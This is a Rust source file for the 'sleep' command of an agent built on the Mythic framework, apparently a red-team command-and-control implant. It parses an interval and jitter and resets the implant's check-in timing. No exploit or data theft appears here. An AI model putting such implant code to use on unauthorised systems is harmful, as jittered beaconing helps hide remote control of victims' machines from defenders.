use mythic::{TaskMessage, TaskResponse};
use serde::Deserialize;

use crate::set_sleep;

#[derive(Deserialize)]
struct Params {
    interval: u64,
    jitter: Option<u64>,
}

pub fn handle(task: &TaskMessage) -> TaskResponse {
    match serde_json::from_str::<Params>(&task.parameters) {
        Ok(p) => {
            set_sleep(p.interval, p.jitter);
            TaskResponse {
                task_id: task.id,
                completed: Some(true),
                status: Some("completed".into()),
                user_output: Some(format!(
                    "sleep updated: interval={}s, jitter={:?}",
                    p.interval, p.jitter
                )),
                ..Default::default()
            }
        }
        Err(e) => TaskResponse::failed(task.id, &format!("sleep parse error: {e}")),
    }
}
